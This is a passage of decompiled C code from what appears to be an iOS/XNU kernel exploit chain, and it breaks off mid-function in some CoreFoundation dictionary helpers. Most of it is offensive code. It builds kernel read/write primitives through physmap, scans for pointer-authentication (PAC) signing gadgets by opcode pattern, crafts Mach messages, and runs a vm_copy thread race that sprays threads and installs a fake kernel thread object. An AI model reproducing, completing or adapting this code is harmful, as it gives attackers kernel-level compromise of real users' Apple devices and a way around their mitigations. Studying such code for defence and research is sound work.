__int64 __fastcall read_ipc_port_table_entry(struct_krwCtx *krwCtx, __int64 a2, unsigned int a3, unsigned __int64 *a4)
{
  __int64 v7; // x19
  __int64 v9; // [xsp+8h] [xbp-38h] BYREF
  __int64 v10; // [xsp+10h] [xbp-30h] BYREF
  unsigned __int64 v11; // [xsp+18h] [xbp-28h] BYREF

  *a4 = 0;
  v9 = 0;
  v7 = get_ipc_kobject_offset(krwCtx, a2, &v11);
  if ( !(uint32_t)v7 )
  {
    v7 = 163855;
    if ( kread_physmap_decorated(krwCtx, v11 + 8LL * a3, (unsigned __int64 *)&v10) )
    {
      if ( validate_kaddr_range(krwCtx, v10) )
      {
        if ( kread_physmap_decorated(krwCtx, v10 + 16, (unsigned __int64 *)&v9) )
        {
          validate_kaddr_range(krwCtx, v9);
          if ( kread_physmap_decorated(krwCtx, v9 + 56, a4) )
            return 0;
          else
            return 163855;
        }
      }
      else
      {
        return 163878;
      }
    }
  }
  return v7;
}

//----- (0000000000010604) ----------------------------------------------------
__int64 __fastcall kwrite_u64_via_kobject(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  if ( (unsigned int)kwrite_with_retry(KRWCTX_FROM_RAW_FIELD(a1, 32), a2, a3, a4) )
    return 0;
  else
    return 5;
}

//----- (000000000001062C) ----------------------------------------------------
__int64 __fastcall kread_via_kobject(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  if ( (unsigned int)krw_read_thunk(KRWCTX_FROM_RAW_FIELD(a1, 32), a2, a4, (void *)a3) )
    return 0;
  else
    return 5;
}

//----- (0000000000010660) ----------------------------------------------------
__int64 __fastcall kread_u64_value(__int64 a1, __int64 a2)
{
  __int64 v3; // [xsp+8h] [xbp-8h] BYREF

  if ( (unsigned int)krw_read_thunk(KRWCTX_FROM_RAW_FIELD(a1, 32), a2, 8, &v3) )
    return v3;
  else
    return 0;
}

//----- (0000000000010698) ----------------------------------------------------
__int64 __fastcall kwrite_u64_to_addr(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // [xsp+8h] [xbp-8h] BYREF

  v4 = a3;
  if ( (unsigned int)kwrite_with_retry(KRWCTX_FROM_RAW_FIELD(a1, 32), a2, (__int64)&v4, 8) )
    return 0;
  else
    return 5;
}

//----- (00000000000106D4) ----------------------------------------------------
__int64 __fastcall kread_u32_value(__int64 a1, unsigned __int64 a2)
{
  unsigned int v3; // [xsp+Ch] [xbp-4h] BYREF

  if ( kread_u32(*(uint64_t *)(a1 + 0x20), a2, &v3) )
    return v3;
  else
    return 0;
}

//----- (0000000000010708) ----------------------------------------------------
__int64 __fastcall flush_cpu_cache(__int64 a1, mach_vm_address_t a2, int a3)
{
  if ( noppl_kwrite32(*(uint64_t *)(a1 + 32), a2, a3) )
    return 0;
  else
    return 5;
}

struct kobj_snapshot_buf
{
  uint64_t *sectionHeader;
  uint8_t *bytes;
  uint64_t size;
};

#define LOOKUP_KOBJ_PATTERN(snapshot, words, masks, count) \
  kobj_snapshot_lookup_wrapper((snapshot), (__int64)(words), (__int64)(masks), (count))

//----- (0000000000010730) ----------------------------------------------------
__int64 __fastcall setup_iokit_notify_dispatch(uint64_t *a1, uint64_t **a2)
{
  a1[1] = 176;

  // qword_48000: notification selector, stored at the match + 4.
  const uint32_t notificationSelectorWords[] = {
    0xD280000F, // mov x15, #0
    0x00000000,
    0xD280000F, // mov x15, #imm, register fixed by mask
    0x00000000,
    0xD280000F, // mov x15, #imm, register fixed by mask
  };
  const uint32_t notificationSelectorMasks[] = {
    0xFFFFFFFF,
    0x00000000,
    0xFFFFFC1F,
    0x00000000,
    0xFFFFFC1F,
  };
  a1[0] = LOOKUP_KOBJ_PATTERN(a2, notificationSelectorWords, notificationSelectorMasks, 5) + 4;

  // qword_48010/qword_48018/qword_48040: PACGA gadget cluster:
  // pacga x1 with x0/x2/x3/x4/x5, store it at [x0,#0x128], then return.
  const uint32_t pacgaClusterWords[] = {
    0x9AC03021, // pacga x1, x1, x0
    0x9262F842, // and   x2, x2, #0xffffffffdfffffff
    0x9AC13041, // pacga x1, x2, x1
    0x9AC13061, // pacga x1, x3, x1
    0x9AC13081, // pacga x1, x4, x1
    0x9AC130A1, // pacga x1, x5, x1
    0xF9009401, // str   x1, [x0, #0x128]
    0xD65F03C0, // ret
  };
  const uint32_t pacgaClusterMasks[] = {
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
  };
  unsigned __int64 pacgaCluster = LOOKUP_KOBJ_PATTERN(a2, pacgaClusterWords, pacgaClusterMasks, 8);
  a1[2] = pacgaCluster;
  a1[3] = pacgaCluster + 20;
  a1[8] = pacgaCluster + 28;

  const uint32_t allExact3[] = { 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF };

  // qword_48020: IA-key signing/store gadget.
  const uint32_t paciaStoreWords[] = {
    0xDAC10230, // pacia x16, x17
    0xF9000010, // str   x16, [x0]
    0xD65F03C0, // ret
  };
  a1[4] = LOOKUP_KOBJ_PATTERN(a2, paciaStoreWords, allExact3, 3);

  // qword_48028: DA-key signing/store twin of qword_48020.
  const uint32_t pacdaStoreWords[] = {
    0xDAC10A30, // pacda x16, x17
    0xF9000010, // str   x16, [x0]
    0xD65F03C0, // ret
  };
  a1[5] = LOOKUP_KOBJ_PATTERN(a2, pacdaStoreWords, allExact3, 3);

  // qword_48030: interrupt/thread-state helper.
  const uint32_t threadStateHelperWords[] = {
    0xD5034FDF, // msr DAIFSet, #0xf
    0xD538D083, // mrs x3, TPIDR_EL1
    0x910002BF, // mov sp, x21
  };
  a1[6] = LOOKUP_KOBJ_PATTERN(a2, threadStateHelperWords, allExact3, 3);

  // qword_48038: kernel message/page-info helper.
  const uint32_t pageInfoHelperWords[] = {
    0xF9000E60, // str x0, [x19, #0x18]
    0xF94046E0, // ldr x0, [x23, #0x88]
    0x00000000,
    0xD2808471, // mov x17, #0x423
    0xD73F0911, // blraa x8, x17
  };
  const uint32_t pageInfoHelperMasks[] = {
    0xFFFFFFFF,
    0xFFFFFFFF,
    0x00000000,
    0xFFFFFFFF,
    0xFFFFFFFF,
  };
  a1[7] = LOOKUP_KOBJ_PATTERN(a2, pageInfoHelperWords, pageInfoHelperMasks, 5);
  return 0;
}
// 42F30: using guessed type __int128 xmmword_42F30;
// 42F44: using guessed type __int128 xmmword_42F44;
// 42F58: using guessed type __int128 xmmword_42F58;
// 42F78: using guessed type __int128 xmmword_42F78;
// 42F8C: using guessed type __int128 xmmword_42F8C;

//----- (000000000001091C) ----------------------------------------------------
unsigned __int64 __fastcall send_port_alloc_msg(__int64 a1, int a2)
{
  size_t v4; // x20
  mach_msg_header_t *v5; // x0
  mach_port_name_t v6; // w8
  __int64 v7; // x20
  __int64 v8; // x0
  struct_krwCtx *v9; // x21
  __int64 v10; // x0
  unsigned __int64 v11; // x21
  mach_port_name_t name; // [xsp+Ch] [xbp-24h] BYREF

  name = 0;
  mach_port_allocate(mach_task_self_, 1u, &name);
  v4 = (unsigned int)(a2 + 24);
  v5 = (mach_msg_header_t *)calloc(1u, v4);
  v6 = name;
  v5->msgh_size = v4;
  v5->msgh_remote_port = v6;
  v5->msgh_bits = 21;
  mach_msg_send(v5);
  v7 = krw_lookup_via_ctx_field32(*(uint64_t *)(a1 + 8), name) + 32;
  v8 = kread_u64_value(*(uint64_t *)(a1 + 8), v7);
  v9 = KRWCTX_FROM_RAW_FIELD(*(uint64_t *)(a1 + 8), 32);
  v10 = kread_u64_value(*(uint64_t *)(a1 + 8), v8 + 16);
  v11 = krw_xpac_vaddr_2(v9, v10);
  kwrite_u64_to_addr(*(uint64_t *)(a1 + 8), v7, 0);
  mach_port_destroy(mach_task_self_, name);
  return v11 + 32;
}

//----- (00000000000109F8) ----------------------------------------------------
__int64 __fastcall setup_kernel_exploit_msg(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, __int64 a5, __int64 a6, __int64 a7)
{
  __int64 v14; // x26
  uint64_t *v15; // x8
  __int64 v16; // x9
  mach_msg_header_t *v17; // x0
  mach_port_name_t v18; // w4

  v14 = *(uint64_t *)(a1 + 16);
  *(uint32_t *)(v14 + 1032) = *(uint32_t *)(v14 + 8);
  *(uint32_t *)(v14 + 1036) = 0;
  *(uint32_t *)(v14 + 1044) = *(uint32_t *)(v14 + 20) + 100;
  memcpy((void *)(v14 + 1068), (const void *)(v14 + 56), 0x210u);
  *(NDR_record_t *)(v14 + 1048) = NDR_record;
  *(uint32_t *)(v14 + 1064) = 132;
  *(uint64_t *)(v14 + 1056) = 0x1100000000LL;
  *(uint64_t *)(v14 + 1024) = 0x23C00000012LL;
  memcpy(*(void **)(a1 + 24), (const void *)(a1 + 44), 0x130u);
  v16 = *(uint64_t *)(a1 + 16);
  v15 = *(uint64_t **)(a1 + 24);
  v15[1] = a2;
  v15[2] = a3;
  v15[3] = a4;
  v15[4] = a5;
  v15[5] = a6;
  v15[6] = a7;
  mach_msg_send((mach_msg_header_t *)(v16 + 1024));
  bzero(*(void **)(a1 + 16), 0x800u);
  v17 = *(mach_msg_header_t **)(a1 + 16);
  v18 = *(uint32_t *)(a1 + 368);
  return mach_msg(v17, 2, 0, 0x400u, v18, 0, 0);
}
// 10AF8: variable 'vars8' is possibly undefined

//----- (0000000000010B08) ----------------------------------------------------
__int64 __fastcall mach_vm_page_info_query(uint64_t *a1, __int64 a2, unsigned int a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v7; // x9
  __int64 v8; // x10
  __int64 v9; // x6
  __int64 v10; // x9
  __int64 result; // x0

  v7 = 0;
  v8 = a1[44];
  do
  {
    *(uint64_t *)(v8 + 8 + v7) = *(uint64_t *)(a6 + v7);
    v7 += 8;
  }
  while ( v7 != 240 );
  *(uint64_t *)(v8 + 256) = a5;
  *(uint64_t *)((char *)a1 + 220) = a1[45];
  v10 = *(uint64_t *)(a6 + 128);
  v9 = *(uint64_t *)(a6 + 136);
  *(uint64_t *)(v8 + 264) = a2;
  *(uint32_t *)(v8 + 272) = a3;
  *(uint64_t *)(v8 + 248) = a4;
  *(uint64_t *)(v8 + 136) = v10;
  *(uint64_t *)(v8 + 144) = v9;
  result = setup_kernel_exploit_msg((__int64)a1, a1[45], a2, a3, a4, v10, v9);
  *(uint64_t *)((char *)a1 + 220) = a1[47];
  return result;
}

//----- (0000000000010B90) ----------------------------------------------------
__int64 __fastcall query_phys_page_info(__int64 a1, __int64 a2, __int64 a3)
{
  *(uint64_t *)(a3 + 168) = *(uint64_t *)(a1 + 376);
  return mach_vm_page_info_query((uint64_t *)a1, a2, *(uint32_t *)(a1 + 656), *(uint64_t *)(a1 + 624), *(uint64_t *)(a1 + 632), a3);
}

//----- (0000000000010C2C) ----------------------------------------------------
__int64 __fastcall setup_ipc_port_exploit_payload(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  __int64 v7; // x4
  __int64 v8; // x22
  __int64 v9; // x23
  __int64 v10; // x24
  __int64 v11; // x8
  __int64 v12; // x10
  __int64 v13; // x0
  __int64 v14; // x1
  uint64_t payload[30]; // [xsp+0h] [xbp-140h] BYREF

  memset(payload, 0, sizeof(payload));
  v7 = *(uint64_t *)(a1 + 632);
  if ( v7 )
  {
    v8 = *(uint64_t *)(a1 + 632);
    if ( (*(uint8_t *)(a1 + 652) & 1) == 0 )
      v8 = *(uint64_t *)(a1 + 632);
  }
  else
  {
    v8 = 0;
  }
  if ( a3 >= 1 )
  {
    v9 = 0;
    v10 = (unsigned int)a3;
    do
    {
      if ( (unsigned int)v9 < 8 || (uint32_t)v9 == 15 )
      {
        payload[v9] = *(uint64_t *)(a4 + 8 * v9);
      }
      else
      {
        kwrite_u64_to_addr(*(uint64_t *)(a1 + 8), v8, *(uint64_t *)(a4 + 8 * v9));
        v8 += 8;
      }
      ++v9;
    }
    while ( v10 != v9 );
    v7 = *(uint64_t *)(a1 + 632);
  }
  v11 = *(uint64_t *)(a1 + 664);
  v12 = *(uint64_t *)(a1 + 376);
  payload[19] = v11 + 61416;
  payload[21] = v12;
  payload[23] = v11 + 61312;
  mach_vm_page_info_query((uint64_t *)a1, a2, *(uint32_t *)(a1 + 660), qword_48038, v7, (__int64)payload);
  v13 = *(uint64_t *)(a1 + 8);
  v14 = *(uint64_t *)(a1 + 664) + 61440LL;
  return kread_u64_value(v13, v14);
}

//----- (0000000000010DEC) ----------------------------------------------------
__int64 __fastcall send_iokit_notification(__int64 a1, __int64 a2, uint64_t *a3)
{
  uint64_t payload[29]; // [xsp+10h] [xbp-100h] BYREF

  memset(payload, 0, sizeof(payload));
  for ( __int64 i = 0; i != 29; ++i )
    payload[i] = a3[i];
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, uint64_t *))(*(uint64_t *)a1 + 8LL))(a1, a2, 29, payload);
}

//----- (0000000000010EA8) ----------------------------------------------------
__int64 __fastcall prepare_iokit_notification_payload(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // x0
  __int64 v5; // x1
  uint64_t payload[30]; // [xsp+8h] [xbp-108h] BYREF

  memset(payload, 0, sizeof(payload));
  payload[0] = *(uint64_t *)(a1 + 664) + 61440LL;
  payload[16] = a2;
  payload[17] = a3;
  query_phys_page_info(a1, qword_48020, (__int64)payload);
  v4 = *(uint64_t *)(a1 + 8);
  v5 = *(uint64_t *)(a1 + 664) + 61440LL;
  return kread_u64_value(v4, v5);
}

//----- (0000000000010F6C) ----------------------------------------------------
__int64 __fastcall vtable_call_slot2(__int64 a1, __int64 a2)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, uint64_t))(*(uint64_t *)a1 + 16LL))(a1, a2, 0);
}

//----- (0000000000010F84) ----------------------------------------------------
__int64 __fastcall setup_notification_extra_args(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // x0
  __int64 v5; // x1
  uint64_t payload[30]; // [xsp+8h] [xbp-118h] BYREF

  memset(payload, 0, sizeof(payload));
  payload[0] = *(uint64_t *)(a1 + 664) + 61696LL;
  payload[16] = a2;
  payload[17] = a3;
  query_phys_page_info(a1, qword_48028, (__int64)payload);
  v4 = *(uint64_t *)(a1 + 8);
  v5 = *(uint64_t *)(a1 + 664) + 61696LL;
  return kread_u64_value(v4, v5);
}

//----- (0000000000011054) ----------------------------------------------------
__int64 __fastcall trigger_kstate_write_vtable(__int64 *a1, __int64 a2, __int64 a3)
{
  uint64_t payload[6]; // [xsp+8h] [xbp-48h] BYREF

  memset(payload, 0, sizeof(payload));
  payload[0] = a1[83] + 61400;
  payload[1] = a3;
  (*(void (__fastcall **)(__int64 *, __int64, __int64, uint64_t *))(*a1 + 8))(a1, qword_48018, 6, payload);
  return kread_u64_value(a1[1], a1[83] + 61696);
}

//----- (00000000000110FC) ----------------------------------------------------
__int64 __fastcall pack_exploit_args_buffer(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9)
{
  volatile __int64 *stackArgs; // [xsp+8h] [xbp-98h]
  uint64_t payload[16]; // [xsp+10h] [xbp-90h] BYREF

  stackArgs = (volatile __int64 *)((char *)__builtin_frame_address(0) + 16);
  memset(payload, 0, sizeof(payload));
  for ( __int64 i = 0; i != 8; ++i )
    payload[i] = stackArgs[i];
  payload[15] = a2;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, uint64_t *))(*(uint64_t *)a1 + 8LL))(
           a1,
           qword_48000,
           16,
           payload);
}

//----- (00000000000111C0) ----------------------------------------------------
__int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
{
  VmcopyRaceState *state = (VmcopyRaceState *)someStruct;
  __int64 *kreadCtxSlot = (__int64 *)&state->kreadCtx;
  int cpuBoardId = *(uint32_t *)(*(uint64_t *)(*kreadCtxSlot + 32LL) + 320LL);
  thread_act_t childThread = 0;
  thread_act_t stateThread = 0;
  semaphore_t readySemaphore = 0;
  semaphore_t resumeSemaphore = 0;
  uint32_t pageShift = 0;
  natural_t suspendedThreadState[0x44]; // BYREF
  VmcopyWritePhysmapBlock writePhysmapBlock = nil;
  integer_t policyInfo[4]; // BYREF
  pthread_t raceThread; // BYREF
  __block __int64 raceState; // BYREF
  __block thread_act_t targetThread = 0; // BYREF
  thread_act_t sprayedThread; // BYREF
  uint64_t pageInfoPayload[VMCOPY_PAGE_INFO_PAYLOAD_WORDS]; // BYREF
  VmcopyTargetThreadMapping targetMapping; // BYREF
  __int128 savedThreadObject[19]; // BYREF
  __int128 capturedThreadSlots[16]; // BYREF

  thread_create(mach_task_self_, &childThread);
  thread_create(mach_task_self_, &stateThread);
  semaphore_create(mach_task_self_, &readySemaphore, 0, 0);
  semaphore_create(mach_task_self_, &resumeSemaphore, 0, 0);

  uint64_t kernelVaBase = kernel_va_base_resolver(KRWCTX_FROM_RAW_FIELD(*kreadCtxSlot, 32), 0, &pageShift);
  VmcopyPackedMemoryEntry memoryEntry = vmcopy_make_packed_memory_entry(*kreadCtxSlot, kernelVaBase, pageShift);
  mem_entry_name_port_t objectHandle = memoryEntry.objectHandle;
  uint64_t memoryEntryPageInfoKaddr = memoryEntry.pageInfoKaddr;
  uint64_t packedPageInfoBase = memoryEntry.pageInfoTableBase
                              - 48LL * memoryEntry.pageInfoRef
                              + VMCOPY_PACKED_PAGE_INFO_BASE_BIAS;
  uint64_t kernelTextPageInfo = vmcopy_find_kernel_text_page_info(state, packedPageInfoBase, kernelVaBase, pageShift);

  kwrite_u64_to_addr(*kreadCtxSlot, memoryEntry.objectKaddr + 24, 0);
  kwrite_u64_to_addr(*kreadCtxSlot, memoryEntry.objectKaddr + 32, -16384);

  sprayedThread = 0;
  vmcopy_spray_threads(&sprayedThread, VMCOPY_THREAD_SPRAY_COUNT);
  uint32_t policyOffset = 0;
  uint64_t memoryEntryPatchPageInfoKaddr = memoryEntry.pageInfoDataKaddr + 48;
  uint32_t restorePageRef = (memoryEntryPageInfoKaddr - kernelVaBase) >> pageShift;
  void *exceptionSnapshot = state->capturedThreadObjectSnapshot;
  int raceStatus;
  do
  {
    if ( !vmcopy_prepare_target_thread_mapping(
            state,
            memoryEntryPatchPageInfoKaddr,
            restorePageRef,
            objectHandle,
            &targetThread,
            &targetMapping,
            savedThreadObject) )
    {
      raceStatus = VMCOPY_RACE_RETRY;
      continue;
    }

    uint64_t targetTaskKaddr = targetMapping.taskKaddr;
    uint64_t originalThreadPtr = targetMapping.originalThreadPtr;
    uint64_t targetThreadKaddr = targetMapping.threadKaddr;
    vm_address_t mappedTaskPage = targetMapping.mappedTaskPage;
    __int64 *targetThreadSlot = targetMapping.taskThreadSlot;
    VmcopyThreadObjectView *mappedThreadObject = (VmcopyThreadObjectView *)targetMapping.mappedThreadObject;

    raceState = 0;
    memset(capturedThreadSlots, 0, sizeof(capturedThreadSlots));
    void *capturedThreadList = capturedThreadSlots;
    void (^raceThreadBlock)(void) = ^{
      vmcopy_run_exploit_thread_body(&raceState, &targetThread, capturedThreadList);
    };
    pthread_create(&raceThread, 0, recomp_run_copied_void_block_thread, recomp_copy_void_block_thread_arg(raceThreadBlock));
    semaphore_wait(readySemaphore);

    uint64_t raceThreadKaddr = vmcopy_set_low_priority_and_find_policy_offset(*kreadCtxSlot, raceThread, policyInfo, &policyOffset);
    flush_cpu_cache(*kreadCtxSlot, raceThreadKaddr + policyOffset + 4, 1);
    vmcopy_prepare_current_thread_policy_race(*kreadCtxSlot, policyOffset, policyInfo);
    semaphore_signal(resumeSemaphore);

    *(targetThreadSlot - 1) = 0;
    uint64_t originalNext = vmcopy_apply_thread_policy_bits(state, mappedThreadObject);
    if ( cpuBoardId <= 10001 )
      *targetThreadSlot = 0;

    uint64_t replacementThreadKaddr = vmcopy_wait_for_thread_slot_replacement(*kreadCtxSlot, targetThreadSlot, originalThreadPtr, &raceState);
    pthread_join(raceThread, 0);
    if ( cpuBoardId <= 10001 )
      *targetThreadSlot = replacementThreadKaddr;

    thread_act_t capturedThread = vmcopy_take_thread_for_kobject(
                                    *kreadCtxSlot,
                                    (thread_act_t *)capturedThreadSlots,
                                    sizeof(capturedThreadSlots),
                                    targetTaskKaddr);
    __int64 captureState;
    if ( capturedThread )
    {
      raceState = 3;
      state->capturedThreadPort = capturedThread;
      captureState = 3;
    }
    else
    {
      captureState = raceState;
    }

    uint64_t replacementNext = mappedThreadObject->next;
    if ( originalNext == replacementNext || replacementNext == 0 || captureState != 3 )
    {
      vmcopy_terminate_thread_if_live(&state->capturedThreadPort);
      vmcopy_terminate_thread_list((thread_act_t *)capturedThreadSlots, sizeof(capturedThreadSlots));
      raceStatus = VMCOPY_RACE_RETRY;
      continue;
    }

    vmcopy_mark_thread_policy_word_if_needed(*kreadCtxSlot, mappedTaskPage, targetTaskKaddr);
    vmcopy_spray_threads_and_clear_prev_link(*kreadCtxSlot, &sprayedThread, VMCOPY_THREAD_SPRAY_COUNT);
    kwrite_u64_to_addr(*kreadCtxSlot, targetTaskKaddr + qword_48008 - 8, targetThreadKaddr);
    kwrite_u64_to_addr(*kreadCtxSlot, qword_48008 + targetTaskKaddr, originalThreadPtr);

    uint64_t baselineNext = vmcopy_prepare_thread_state_physmap_race(
                              state,
                              &memoryEntry,
                              restorePageRef,
                              packedPageInfoBase,
                              kernelVaBase,
                              pageShift,
                              kernelTextPageInfo,
                              &targetMapping,
                              stateThread,
                              childThread,
                              suspendedThreadState,
                              &writePhysmapBlock,
                              savedThreadObject);
    uint64_t capturedSnapshot = vmcopy_run_thread_state_race(
                                  state,
                                  savedThreadObject,
                                  writePhysmapBlock,
                                  resumeSemaphore,
                                  readySemaphore,
                                  baselineNext,
                                  replacementNext,
                                  originalNext,
                                  targetThreadKaddr);
    recomp_release_block(writePhysmapBlock);
    writePhysmapBlock = nil;
    memcpy(exceptionSnapshot, (const void *)capturedSnapshot, VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES);
    vmcopy_receive_captured_thread_exception(state, exceptionSnapshot);
    vmcopy_install_final_fake_thread_object(
      state,
      memoryEntryPatchPageInfoKaddr,
      state->mappedKernelTextPageRef,
      restorePageRef,
      objectHandle,
      pageInfoPayload);
    state->childThreadPort = stateThread;

    if ( readySemaphore + 1 >= 2 )
      semaphore_destroy(mach_task_self_, readySemaphore);
    if ( resumeSemaphore + 1 >= 2 )
      semaphore_destroy(mach_task_self_, resumeSemaphore);
    raceStatus = VMCOPY_RACE_DONE;
  }
  while ( raceStatus == VMCOPY_RACE_RETRY );
  return 0;
}

//----- (00000000000127C0) ----------------------------------------------------
__int64 __fastcall get_ppnum_via_kread(__int64 a1)
{
  __int64 v2; // x0
  struct_krwCtx *v3; // x20
  __int64 v4; // x0
  unsigned __int64 v5; // x0
  __int64 v6; // x22
  __int64 v7; // x24
  vm_address_t v8; // x20
  __int64 v9; // x21
  __int64 result; // x0
  int v11; // w23
  __int64 v12; // x24
  __int128 v13; // [xsp+0h] [xbp-70h] BYREF
  __int128 v14; // [xsp+10h] [xbp-60h]

  v2 = *(uint64_t *)(a1 + 8);
  v3 = KRWCTX_FROM_RAW_FIELD(v2, 32);
  v4 = kread_u64_value(v2, *(uint64_t *)(v2 + 16) + 40LL);
  v5 = krw_xpac_vaddr_2(v3, v4);
  v6 = kread_u64_value(*(uint64_t *)(a1 + 8), v5 + 24);
  while ( 1 )
  {
    v7 = v6;
    v8 = kread_u64_value(*(uint64_t *)(a1 + 8), v6 + 16);
    v9 = kread_u64_value(*(uint64_t *)(a1 + 8), v6 + 24);
    result = kread_u32_value(*(uint64_t *)(a1 + 8), v6 + 72);
    if ( v8 == 0x1000000000LL )
      break;
    v11 = result;
    v6 = kread_u64_value(*(uint64_t *)(a1 + 8), v6 + 8);
    if ( v11 < 0 )
    {
      v13 = 0u;
      v14 = 0u;
      v12 = v7 + 48;
      kread_via_kobject(*(uint64_t *)(a1 + 8), v12, (__int64)&v13, 32);
      HIDWORD(v13) = *(uint64_t *)(a1 + 32);
      kwrite_u64_via_kobject(*(uint64_t *)(a1 + 8), v12, (__int64)&v13, 32);
      v13 = 0u;
      v14 = 0u;
      kread_via_kobject(*(uint64_t *)(a1 + 8), v12, (__int64)&v13, 32);
      DWORD2(v14) = v11 & 0x7FFFFFFF;
      kwrite_u64_via_kobject(*(uint64_t *)(a1 + 8), v12, (__int64)&v13, 32);
      vm_deallocate(mach_task_self_, v8, v9 - v8);
    }
  }
  return result;
}

//----- (0000000000012954) ----------------------------------------------------
__int64 __fastcall compare_cfdict_entries(const void *a1, const void *a2)
{
  __int64 v2; // x20
  CFTypeID v5; // x22
  CFTypeID v6; // x22
  void (__cdecl *v7)(const void *, const void *, void *); // x0
  CfCollectionApplyContext context; // BYREF

  v2 = 708609;
  if ( a1 )
  {
    v5 = CFGetTypeID(a1);
    if ( v5 == CFDictionaryGetTypeID() )
    {
      if ( a2 )
      {
        v6 = CFGetTypeID(a2);
        if ( v6 == CFDictionaryGetTypeID() )
        {
          context.status = 0;
          context.reserved = 0;
          context.object = a1;
          v7 = (void (__cdecl *)(const void *, const void *, void *))nullsub_1(iterate_cftype_values);
          CFDictionaryApplyFunction((CFDictionaryRef)a2, v7, &context);
          return context.status;
        }
      }
    }
  }
  return v2;
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (00000000000129F8) ----------------------------------------------------
void __fastcall iterate_cftype_values(const void *a1, CFTypeRef cf, __int64 a3)
{
  CfCollectionApplyContext *dictContext; // x20
  CFTypeID v6; // x22
  CFTypeID v7; // x22
  int v8; // w23
  void *v9; // x21
  CFTypeID v10; // x22
  CFTypeID v11; // x22
  CFTypeID v12; // x22
  CFIndex Count; // x22
  void (__cdecl *v14)(const void *, void *); // x0
  CFIndex v15; // x21
  void (__cdecl *v16)(const void *, void *); // x0
  int v17; // w8
  void *value; // [xsp+8h] [xbp-48h] BYREF
  uint8_t allArrayValuesAreStrings; // BYREF
  CfCollectionApplyContext arrayContext; // BYREF
  CFRange v21; // 0:x1.16
  CFRange v22; // 0:x1.16

  dictContext = (CfCollectionApplyContext *)a3;
  if ( !dictContext || dictContext->status )
    return;
  if ( !a1 || !cf )
  {
    v17 = 708609;
LABEL_22:
    *(uint32_t *)a3 = v17;
    return;
  }
  v6 = CFGetTypeID(cf);
  if ( CFStringGetTypeID() != v6 && CFArrayGetTypeID() != v6 && CFBooleanGetTypeID() != v6 && CFNumberGetTypeID() != v6 )
    goto LABEL_21;
  value = 0;
  if ( !CFDictionaryGetValueIfPresent((CFDictionaryRef)dictContext->object, a1, (const void **)&value) )
    goto LABEL_19;
  v7 = CFGetTypeID(value);
  if ( CFGetTypeID(cf) != v7 )
  {
LABEL_21:
    v17 = 708628;
    goto LABEL_22;
  }
  if ( CFArrayGetTypeID() == v7 )
  {
    v8 = 708609;
    v9 = value;
    if ( value )
    {
      v10 = CFGetTypeID(value);
      if ( v10 == CFArrayGetTypeID() )
      {
        v11 = CFGetTypeID(cf);
        if ( v11 == CFArrayGetTypeID() )
        {
          v12 = CFGetTypeID(cf);
          if ( v12 == CFArrayGetTypeID() )
          {
            allArrayValuesAreStrings = 1;
            Count = CFArrayGetCount((CFArrayRef)cf);
            v14 = (void (__cdecl *)(const void *, void *))nullsub_1(check_cfstring_type);
            v21.location = 0;
            v21.length = Count;
            CFArrayApplyFunction((CFArrayRef)cf, v21, v14, &allArrayValuesAreStrings);
            if ( allArrayValuesAreStrings )
            {
              arrayContext.status = 0;
              arrayContext.reserved = 0;
              arrayContext.object = v9;
              v15 = CFArrayGetCount((CFArrayRef)cf);
              v16 = (void (__cdecl *)(const void *, void *))nullsub_1(cfarray_add_unique);
              v22.location = 0;
              v22.length = v15;
              CFArrayApplyFunction((CFArrayRef)cf, v22, v16, &arrayContext);
              v8 = arrayContext.status;
            }
            else
            {
              v8 = 708628;
            }
          }
        }
      }
    }
    dictContext->status = v8;
    return;
  }
LABEL_19:
  if ( !dictContext->status )
    CFDictionarySetValue((CFMutableDictionaryRef)dictContext->object, a1, cf);
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000012BF4) ----------------------------------------------------
__int64 __fastcall merge_cfdict_entries(const void *a1, const void *a2)
{
  __int64 v2; // x20
  CFTypeID v5; // x22
  CFTypeID v6; // x22
  void (__cdecl *v7)(const void *, const void *, void *); // x0
  CfCollectionApplyContext context; // BYREF

  v2 = 708609;
  if ( a1 )
  {
    v5 = CFGetTypeID(a1);
    if ( v5 == CFDictionaryGetTypeID() )
    {
      if ( a2 )
      {
        v6 = CFGetTypeID(a2);
        if ( v6 == CFDictionaryGetTypeID() )
        {
          context.status = 0;
          context.reserved = 0;
          context.object = a1;
          v7 = (void (__cdecl *)(const void *, const void *, void *))nullsub_1(apply_cfdict_update);
          CFDictionaryApplyFunction((CFDictionaryRef)a2, v7, &context);
          return context.status;
        }
      }
    }
  }
  return v2;
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000012C98) ----------------------------------------------------
void __fastcall apply_cfdict_update(void *key, CFTypeRef valueToCompare, __int64 a3)
{
  CfCollectionApplyContext *dictContext; // x20
  CFTypeID v5; // x21
  CFIndex Count; // x21
  void (__cdecl *v7)(const void *, void *); // x0
  int v8; // w8
  CfCollectionApplyContext arrayContext; // BYREF
  void *value; // [xsp+18h] [xbp-28h] BYREF
  CFRange v12; // 0:x1.16

  dictContext = (CfCollectionApplyContext *)a3;
  if ( dictContext && !dictContext->status )
  {
    if ( key && valueToCompare )
    {
      value = 0;
      if ( !CFDictionaryGetValueIfPresent((CFDictionaryRef)dictContext->object, key, (const void **)&value) )
      {
        v8 = 708625;
        goto LABEL_14;
      }
      v5 = CFGetTypeID(value);
